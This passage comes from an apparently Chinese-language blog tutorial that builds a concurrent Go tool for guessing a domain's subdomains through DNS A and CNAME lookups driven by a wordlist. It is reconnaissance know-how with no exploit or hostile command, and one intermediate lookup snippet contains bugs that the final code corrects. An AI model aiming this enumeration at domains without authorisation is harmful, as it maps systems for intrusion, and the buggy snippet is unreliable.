class="string">&quot;stacktitan.com&quot;</span>)</span><br><span class="line">   msg.SetQuestion(fqdn, dns.TypeA)</span><br><span class="line">   in, err := dns.Exchange(&amp;msg, <span class="string">&quot;8.8.8.8:53&quot;</span>)</span><br><span class="line">   <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">      <span class="built_in">panic</span>(err)</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> <span class="built_in">len</span>(in.Answer) &lt; <span class="number">1</span> &#123; <span class="comment">//确认切片Answer的长度都至少为1。否则表明没有记录。直接返回</span></span><br><span class="line">      fmt.Println(<span class="string">&quot;No records&quot;</span>)</span><br><span class="line">      <span class="keyword">return</span></span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">for</span> _, answer := <span class="keyword">range</span> in.Answer &#123; <span class="comment">//取出应答的记录</span></span><br><span class="line">      <span class="keyword">if</span> a, ok := answer.(*dns.A); ok &#123;  <span class="comment">//这步加上还是会好些，确保处理的类型是*dns.A.</span></span><br><span class="line">         fmt.Println(a.A)</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">//fmt.Println(answer)</span></span><br><span class="line">      <span class="comment">//fmt.Println(answer.(*dns.A).A)</span></span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="枚举子域"><a href="#枚举子域" class="headerlink" title="枚举子域"></a>枚举子域</h4><p>然后，我们来一步步完成子域名枚举的工具，首先我们要知道，我们都需要哪些参数来启动我们的程序，比如目标的根域名、字典的文件名、DNS服务器的地址以及需要的线程数量。我们可以使用flag包来像python那样，使用-xxx xxx来从命令行获取用户输入的参数。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span> (</span><br><span class="line">flDomain = flag.String(<span class="string">&quot;Domain&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;The domain to perform guessing against.&quot;</span>)</span><br><span class="line">flWordlist = flag.String(<span class="string">&quot;Wordlist&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;The wordlist to use for guessing.&quot;</span>)</span><br><span class="line">flWorkerCount = flag.Int(<span class="string">&quot;c&quot;</span>, <span class="number">100</span>, <span class="string">&quot;The amount of workers to use.&quot;</span>)</span><br><span class="line">flServerAddr = flag.String(<span class="string">&quot;server&quot;</span>, <span class="string">&quot;8.8.8.8:53&quot;</span>, <span class="string">&quot;The DNS server to use.&quot;</span>)</span><br><span class="line">)</span><br><span class="line">flag.Parse()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> *flDomain == <span class="string">&quot;&quot;</span> || *flWordlist == <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;-domain and -wordlist are required&quot;</span>)</span><br><span class="line">os.Exit(<span class="number">1</span>)</span><br><span class="line">&#125;</span><br><span class="line">fmt.Println(*flWorkerCount, *flServerAddr)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="查询A记录和CHAME记录"><a href="#查询A记录和CHAME记录" class="headerlink" title="查询A记录和CHAME记录"></a>查询A记录和CHAME记录</h4><ul><li><p>为了让我们的工具输出可解析的域名及其IP地址。创建一个结构体来存储信息</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> result <span class="keyword">struct</span> &#123;</span><br><span class="line">IPAddress <span class="type">string</span></span><br><span class="line">Hostname  <span class="type">string</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>然后我们需要创建2个函数来执行查询，一个用来查询A记录，一个用来查询CNAME记录。两个函数均接受FQDN作为第一个参数，并接受DNS服务器的地址作为第二个参数。每个函数都返回一个字符串切片和一个错误</p></li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">lookupA</span><span class="params">(fqdn, serverAddr <span class="type">string</span>)</span></span> ([]<span class="type">string</span>, <span class="type">error</span>) &#123;</span><br><span class="line">   <span class="keyword">var</span> msg dns.Msg</span><br><span class="line">   <span class="keyword">var</span> ips []<span class="type">string</span></span><br><span class="line">   msg.SetQuestion(dns.Fqdn(fqdn), dns.TypeA)</span><br><span class="line">   in, err := dns.Exchange(&amp;msg, serverAddr)</span><br><span class="line">   <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> ips, err</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">if</span> <span class="built_in">len</span>(in.Answer) &lt; <span class="number">1</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> ips, errors.New(<span class="string">&quot;no answer&quot;</span>)</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">for</span> _, answer := <span class="keyword">range</span> in.Answer &#123;</span><br><span class="line">      <span class="keyword">if</span> a, ok := answer.(*dns.A); ok &#123;</span><br><span class="line">         ips = <span class="built_in">append</span>(ips, a.A.String())</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> ips, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">lookupCNAME</span><span class="params">(fqdn, serverAddr <span class="type">string</span>)</span></span> ([]<span class="type">string</span>, <span class="type">error</span>) &#123;</span><br><span class="line">   <span class="keyword">var</span> m dns.Msg</span><br><span class="line">   <span class="keyword">var</span> fqdns []<span class="type">string</span></span><br><span class="line">   m.SetQuestion(dns.Fqdn(fqdn), dns.TypeCNAME)</span><br><span class="line">   in, err := dns.Exchange(&amp;m, serverAddr)</span><br><span class="line">   <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> fqdns, err</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">if</span> <span class="built_in">len</span>(in.Answer) &lt; <span class="number">1</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> fqdns, errors.New(<span class="string">&quot;no answer&quot;</span>)</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">for</span> _, answer := <span class="keyword">range</span> in.Answer &#123;</span><br><span class="line">      <span class="keyword">if</span> c, ok := answer.(*dns.CNAME); ok &#123;</span><br><span class="line">         fqdns = <span class="built_in">append</span>(fqdns, c.Target)</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> fqdns, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>我们还需要创建一个lookup函数用来处理域名和查询到的ip信息。在这之前，我们需要知道什么是CNAME类型。</li><li>我们的域名不仅仅可以解析成一个ip，还是可以解析成域名的，比如我们将a.haochen1204.com解析成b.haochen1204.com再将b.haochen1204.com解析成c.haocen1204.com，这是一个解析链，所以我们需要查询的a.haochen1204.com的ip，<strong>实际上</strong>存储在c.haochen1204.com的A记录中。</li><li>在lookup函数中，我们首先也是接受了用户要枚举的域名和DNS服务器地址。然后创建一个用来存储结果的结构体，用来将我们查询到的域名和他的（可能是多个）ip对应存放。然后进入一个死循环，首先不断的去查询目标的CNAME字段，直到查询的结果为空，则证明我们查询到了链中的最后一个域名，比如我们上面链中c.haochen1204.com，然后去查找它的A记录，将查询到的结果与我们输入的域名对应起来。比如a.haochen1204.com -&gt; b.haochen1204.com -&gt; c.haochen1204.com  而c.haochen1204.com解析的ip为1.1.1.1和2.2.2.2，那么则存放<strong>a.haochen1204.com -&gt;  1.1.1.1</strong>和<strong>a.haochen1204.com -&gt; 2.2.2.2</strong>。最后，将我们的结果返回</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">lookup</span><span class="params">(fqdn, serverAddr <span class="type">string</span>)</span></span> []result &#123;</span><br><span class="line">    <span class="keyword">var</span> results []result</span><br><span class="line">    <span class="keyword">var</span> cfqdn = fqdn <span class="comment">//请不要修改原始信息</span></span><br><span class="line">    <span class="keyword">for</span> &#123;</span><br><span class="line">        cnames, err := lookupCNAME(cfqdn, serverAddr)</span><br><span class="line">        <span class="keyword">if</span> err != <span class="literal">nil</span> &amp;&amp; <span class="built_in">len</span>(cnames) &gt; <span class="number">0</span> &#123;</span><br><span class="line">            cfqdn = cnames[<span class="number">0</span>]</span><br><span class="line">            <span class="keyword">continue</span>  <span class="comment">//我们必须处理下一个CNAME</span></span><br><span class="line">        &#125;</span><br><span class="line">        ips, err := lookupA(cfqdn, serverAddr)</span><br><span class="line">        <span class="keyword">if</span> err != <span class="literal">nil</span>&#123;</span><br><span class="line">            <span class="keyword">break</span>  <span class="comment">//该主机名没有A记录</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> _, ip := <span class="keyword">range</span> ips &#123;</span><br><span class="line">            results := <span class="built_in">append</span>(results, result&#123;IPAddress:ip, Hostname:fqdn&#125;)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> results</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="添加并发"><a href="#添加并发" class="headerlink" title="添加并发"></a>添加并发</h4><ul><li>然后我们来创建一个goroutine池，用来不断启动我们刚刚完成的lookup函数</li><li>在python中，使用多线程有个很头疼的问题，就是无法获取线程的返回值，而在go中，我们可以通过管道解决这个问题，顺便解决了子线程未运行完，主线程便结束的问题。</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">worker</span><span class="params">(tracker <span class="keyword">chan</span> empty, fqdns <span class="keyword">chan</span> <span class="type">string</span>, gather <span class="keyword">chan</span> []result, serverAddr <span class="type">string</span>)</span></span> &#123;</span><br><span class="line">   <span class="keyword">for</span> fqdn := <span class="keyword">range</span> fqdns &#123; <span class="comment">//fqdns管道储存要枚举得子域名数据</span></span><br><span class="line">      results := lookup(fqdn, serverAddr)</span><br><span class="line">      <span class="keyword">if</span> <span class="built_in">len</span>(results) &gt; <span class="number">0</span> &#123;</span><br><span class="line">         gather &lt;- results <span class="comment">//gather管道收集输出</span></span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">var</span> e empty</span><br><span class="line">   tracker &lt;- e <span class="comment">//判断协程的执行情况</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>如上述代码，我们创建了一个空的结构体，他用来跟踪线程的执行情况，判断其是否执行完成，<strong>为什么使用空的结构体呢</strong>，因为他的大小是0b，而我们也不需要他存储什么数据</li><li>然后我们在主函数中需要添加一些内容，创建我们需要的3个管道以及我们接受最终结果的result结构体列表。通过用户提供的线程数量，将fqdns管道创建为缓冲管道，剩下的管道均为一次只能通过一个数据的管道，如果这个数据阻塞，则剩下的也会阻塞。</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> results []result</span><br><span class="line">fqdns := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">string</span>, *flWorkerCount) <span class="comment">//flWorkerCount = flag.int()</span></span><br><span class="line">gather := <span class="built_in">make</span>(<span class="keyword">chan</span> []result)</span><br><span class="line">tracker := <span class="built_in">make</span>(<span class="keyword">chan</span> empty)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 启动工人函数</span></span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; *flWorkerCount; i++ &#123;</span><br><span class="line"><span class="keyword">go</span> worker(tracker, fqdns, gather, *flServerAddr)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="使用bufio包创建一个文本扫描器"><a href="#使用bufio包创建一个文本扫描器" class="headerlink" title="使用bufio包创建一个文本扫描器"></a>使用bufio包创建一个文本扫描器</h4><ul><li>用bufio包创建一个sacnner，该文本扫描器允许我们一次一行的读取文件。</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//创建新的scanner</span></span><br><span class="line">file, err := os.Open(*flWordlist)</span><br><span class="line"><span class="keyword">defer</span> file.Close()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="built_in">panic</span>(err)</span><br><span class="line">&#125;</span><br><span class="line">scanner := bufio.NewScanner(file)</span><br><span class="line"><span class="keyword">for</span> scanner.Scan() &#123;</span><br><span class="line">fqdns &lt;- fmt.Sprintf(<span class="string">&quot;%s.%s&quot;</span>, scanner.Text(), *flDomain) <span class="comment">//拼接并将下一个子域名传入fqdns管道</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="收集和显示结果"><a href="#收集和显示结果" class="headerlink" title="收集和显示结果"></a>收集和显示结果</h4><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 读取结果</span></span><br><span class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">for</span> r := <span class="keyword">range</span> gather &#123;</span><br><span class="line">results = <span class="built_in">append</span>(results, r...)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> e empty</span><br><span class="line">tracker &lt;- e</span><br><span class="line">&#125;()</span><br><span class="line"></span><br><span class="line"><span class="comment">// 关闭通道（并关闭tracker，线程的执行情况）</span></span><br><span class="line"><span class="built_in">close</span>(fqdns)</span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; *flWorkerCount; i++ &#123;</span><br><span class="line">&lt;-tracker</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">close</span>(gather)</span><br><span class="line">&lt;-tracker</span><br><span class="line"></span><br><span class="line"><span class="comment">// 打印结果</span></span><br><span class="line">w := tabwriter.NewWriter(os.Stdout, <span class="number">0</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="string">&#x27; &#x27;</span>, <span class="number">0</span>)</span><br><span class="line"><span class="keyword">for</span> _, r := <span class="keyword">range</span> results &#123;</span><br><span class="line">fmt.Fprintf(w, <span class="string">&quot;%s\t%s\n&quot;</span>, r.Hostname, r.IPAddress)</span><br><span class="line">&#125;</span><br><span class="line">w.Flush() <span class="comment">//输出</span></span><br></pre></td></tr></table></figure><h4 id="最终代码"><a href="#最终代码" class="headerlink" title="最终代码"></a>最终代码</h4><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;bufio&quot;</span></span><br><span class="line"><span class="string">&quot;errors&quot;</span></span><br><span class="line"><span class="string">&quot;flag&quot;</span></span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;os&quot;</span></span><br><span class="line"><span class="string">&quot;text/tabwriter&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;github.com/miekg/dns&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> result <span class="keyword">struct</span> &#123;</span><br><span class="line">IPAddress <span class="type">string</span></span><br><span class="line">Hostname  <span class="type">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> empty <span class="keyword">struct</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">lookupA</span><span class="params">(fqdn, serverAddr <span class="type">string</span>)</span></span> ([]<span class="type">string</span>, <span class="type">error</span>) &#123;</span><br><span class="line"><span class="keyword">var</span> m dns.Msg</span><br><span class="line"><span class="keyword">var</span> ips []<span class="type">string</span></span><br><span class="line">m.SetQuestion(dns.Fqdn(fqdn), dns.TypeA)</span><br><span class="line">in, err := dns.Exchange(&amp;m, serverAddr)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> ips, err</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(in.Answer) &lt; <span class="number">1</span> &#123;</span><br><span class="line"><span class="keyword">return</span> ips, errors.New(<span class="string">&quot;no answer&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> _, answer := <span class="keyword">range</span> in.Answer &#123;</span><br><span class="line"><span class="keyword">if</span> a, ok := answer.(*dns.A); ok &#123;</span><br><span class="line">ips = <span class="built_in">append</span>(ips, a.A.String())</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> ips, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">lookupCNAME</span><span class="params">(fqdn, serverAddr <span class="type">string</span>)</span></span> ([]<span class="type">string</span>, <span class="type">error</span>) &#123;</span><br><span class="line"><span class="keyword">var</span> m dns.Msg</span><br><span class="line"><span class="keyword">var</span> fqdns []<span class="type">string</span></span><br><span class="line">m.SetQuestion(dns.Fqdn(fqdn), dns.TypeCNAME)</span><br><span class="line">in, err := dns.Exchange(&amp;m, serverAddr)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> fqdns, err</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(in.Answer) &lt; <span class="number">1</span> &#123;</span><br><span class="line"><span class="keyword">return</span> fqdns, errors.New(<span class="string">&quot;no answer&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> _, answer := <span class="keyword">range</span> in.Answer &#123;</span><br><span class="line"><span class="keyword">if</span> c, ok := answer.(*dns.CNAME); ok &#123;</span><br><span class="line">fqdns = <span class="built_in">append</span>(fqdns, c.Target)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> fqdns, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">lookup</span><span class="params">(fqdn, serverAddr <span class="type">string</span>)</span></span> []result &#123;</span><br><span class="line"><span class="keyword">var</span> results []result</span><br><span class="line"><span class="keyword">var</span> cfqdn = fqdn <span class="comment">//请勿修改原始信息</span></span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line">cnames, err := lookupCNAME(cfqdn, serverAddr)</span><br><span class="line"><span class="keyword">if</span> err == <span class="literal">nil</span> &amp;&amp; <span class="built_in">len</span>(cnames) &gt; <span class="number">0</span> &#123;</span><br><span class="line">cfqdn = cnames[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line">ips, err := lookupA(cfqdn, serverAddr)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">break</span> <span class="comment">// 该主机名没有DNS</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> _, ip := <span class="keyword">range</span> ips &#123;</span><br><span class="line">results = <span class="built_in">append</span>(results, result&#123;IPAddress: ip, Hostname: fqdn&#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span> <span class="comment">// 已经处理了所有结果</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> results</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">worker</span><span class="params">(tracker <span class="keyword">chan</span> empty, fqdns <span class="keyword">chan</span> <span class="type">string</span>, gather <span class="keyword">chan</span> []result, serverAddr <span class="type">string</span>)</span></span> &#123;</span><br><span class="line"><span class="keyword">for</span> fqdn := <span class="keyword">range</span> fqdns &#123;</span><br><span class="line">results := lookup(fqdn, serverAddr)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(results) &gt; <span class="number">0</span> &#123;</span><br><span class="line">gather &lt;- results</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> e empty</span><br><span class="line">tracker &lt;- e</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span> (</span><br><span class="line">flDomain      = flag.String(<span class="string">&quot;Domain&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;The domain to perform guessing against.&quot;</span>)</span><br><span class="line">flWordlist    = flag.String(<span class="string">&quot;Wordlist&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;The wordlist to use for guessing.&quot;</span>)</span><br><span class="line">flWorkerCount = flag.Int(<span class="string">&quot;c&quot;</span>, <span class="number">100</span>, <span class="string">&quot;The amount of workers to use.&quot;</span>)</span><br><span class="line">flServerAddr  = flag.String(<span class="string">&quot;server&quot;</span>, <span class="string">&quot;8.8.8.8:53&quot;</span>, <span class="string">&quot;The DNS server to use.&quot;</span>)</span><br><span class="line">results       []result</span><br><span class="line">)</span><br><span class="line">flag.Parse()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> *flDomain == <span class="string">&quot;&quot;</span> || *flWordlist == <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;-domain and -wordlist are required&quot;</span>)</span><br><span class="line">os.Exit(<span class="number">1</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// make 创建内存并分配地址</span></span><br><span class="line">fqdns := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">string</span>, *flWorkerCount)</span><br><span class="line">gather := <span class="built_in">make</span>(<span class="keyword">chan</span> []result)</span><br><span class="line">tracker := <span class="built_in">make</span>(<span class="keyword">chan</span> empty)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建一个新的scanner</span></span><br><span class="line">fh, err := os.Open(*flWordlist)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="built_in">panic</span>(err)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">defer</span> fh.Close()</span><br><span class="line">scanner := bufio.NewScanner(fh)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 启动工人函数</span></span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; *flWorkerCount; i++ &#123;</span><br><span class="line"><span class="keyword">go</span> worker(tracker, fqdns, gather, *flServerAddr)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> scanner.Scan() &#123;</span><br><span class="line">fqdns &lt;- fmt.Sprintf(<span class="string">&quot;%s.%s&quot;</span>, scanner.Text(), *flDomain)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 读取结果</span></span><br><span class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">for</span> r := <span class="keyword">range</span> gather &#123;</span><br><span class="line">results = <span class="built_in">append</span>(results, r...)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> e empty</span><br><span class="line">tracker &lt;- e</span><br><span class="line">&#125;()</span><br><span class="line"></span><br><span class="line"><span class="comment">// 关闭通道并显示结果</span></span><br><span class="line"><span class="built_in">close</span>(fqdns)</span><br><span class="line"><span 